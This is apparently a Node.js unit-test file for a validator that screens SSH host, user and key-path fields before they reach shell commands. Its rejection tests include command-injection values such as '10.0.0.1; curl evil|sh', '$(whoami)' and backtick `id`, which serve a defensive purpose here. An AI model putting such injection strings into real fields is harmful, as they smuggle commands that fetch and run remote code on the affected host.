'use strict';

// Tests for lib/ssh-target-safety.js (#314) — the shared shape-validators for
// SSH-target fields interpolated into shell commands. Source of truth reused by
// openclaw-detect, openclaw-version, and the /api/openclaw/test route.

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');

const { SAFE_HOST, SAFE_USER, SAFE_KEYPATH, unsafeReason } = require('../lib/ssh-target-safety');

const GOOD = { host: '192.168.20.10', sshUser: 'habitat-admin', sshKeyPath: '~/.ssh/genesis_habitat' };

describe('ssh-target-safety (#314)', () => {
  describe('unsafeReason', () => {
    it('accepts a well-formed target', () => {
      assert.equal(unsafeReason(GOOD), null);
    });

    it('accepts IPv4, IPv6, tailscale names, and absolute key paths', () => {
      assert.equal(unsafeReason({ ...GOOD, host: 'fd7a::1' }), null);
      assert.equal(unsafeReason({ ...GOOD, host: 'kobold.tail1234.ts.net' }), null);
      assert.equal(unsafeReason({ ...GOOD, sshKeyPath: '/home/jason/.ssh/id_ed25519' }), null);
    });

    it('requires all three fields', () => {
      assert.match(unsafeReason({ host: 'h', sshUser: 'u' }), /required/);
      assert.match(unsafeReason(null), /required/);
      assert.match(unsafeReason({}), /required/);
    });

    it('rejects shell metacharacters per field', () => {
      assert.match(unsafeReason({ ...GOOD, host: '10.0.0.1; curl evil|sh' }), /host/);
      assert.match(unsafeReason({ ...GOOD, sshUser: 'a$(whoami)' }), /sshUser/);
      assert.match(unsafeReason({ ...GOOD, sshKeyPath: '~/.ssh/k`id`' }), /sshKeyPath/);
      assert.match(unsafeReason({ ...GOOD, host: 'a b' }), /host/);
      assert.match(unsafeReason({ ...GOOD, sshUser: 'u&v' }), /sshUser/);
    });
  });

  describe('regex allow-lists', () => {
    it('SAFE_HOST allows host/ip shapes, rejects metacharacters', () => {
      for (const ok of ['10.0.0.1', 'fd7a::1', 'host.example.com', 'a-b_c']) assert.ok(SAFE_HOST.test(ok), ok);
      for (const bad of ['a;b', 'a b', 'a|b', 'a$(x)', 'a`x`', '']) assert.ok(!SAFE_HOST.test(bad), bad);
    });
    it('SAFE_USER allows usernames, rejects metacharacters', () => {
      for (const ok of ['admin', 'habitat-admin', 'a.b_c']) assert.ok(SAFE_USER.test(ok), ok);
      for (const bad of ['a$(x)', 'a b', 'a;b', '']) assert.ok(!SAFE_USER.test(bad), bad);
    });
    it('SAFE_KEYPATH allows ~ + path bodies, rejects metacharacters', () => {
      for (const ok of ['~/.ssh/id_ed25519', '/home/x/.ssh/k', 'rel/path-1']) assert.ok(SAFE_KEYPATH.test(ok), ok);
      for (const bad of ['~/k`id`', 'a b', 'a;b', '"q"', '']) assert.ok(!SAFE_KEYPATH.test(bad), bad);
    });
  });
});
